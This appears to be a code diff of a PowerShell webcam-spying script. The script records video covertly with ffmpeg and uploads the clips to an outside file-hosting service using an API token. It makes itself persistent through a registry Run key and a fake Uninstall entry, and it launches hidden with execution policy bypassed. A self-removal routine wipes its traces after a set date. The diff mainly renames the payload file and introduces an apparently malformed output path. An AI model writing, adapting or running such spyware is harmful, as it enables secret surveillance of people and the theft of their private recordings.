@@ -27,7 +27,7 @@ function Persist-Logger {
     
         if($date -lt $targetDate){ return }
     
-        Remove-Item "$env:temp\txtlog.ps1" -Force;
+        Remove-Item "$env:temp\camlog.ps1" -Force;
         Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Force
         Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $name -Force
     }
@@ -55,7 +55,7 @@ function Start-WebcamLogger{
     
     while($count -ne $TimesRun){
         $time = Get-Date -Format "ddMMyyyyHHmm";
-        $path = "$env:temp\$env:computername-$time.mp4";
+        $path = "camlog-$env:temp\$env:computername-$time.mp4";
         $url="https://api.anonfiles.com/upload?token=$Anontoken";
         $ffmpegArgs = @(
             "-f dshow",
@@ -94,7 +94,7 @@ if(-not (Test-Path -Path "ffmpeg/ffmpeg.exe" -PathType Leaf)){
     Remove-Item "7z.exe" -Force;
 }
 
-$autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun  + '$DaysRun=' + $DaysRun +  ';Get-Item txtlog.ps1 | Invoke-Expression;sleep 5;exit');
+$autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun  + '$DaysRun=' + $DaysRun +  ';Get-Item camlog.ps1 | Invoke-Expression;sleep 5;exit');
 
 Persist-Logger "camlog" -Command $autostart;
 Start-WebcamLogger -RecordTime $RecordTime -TimesRun $TimesRun -Delay $Delay;
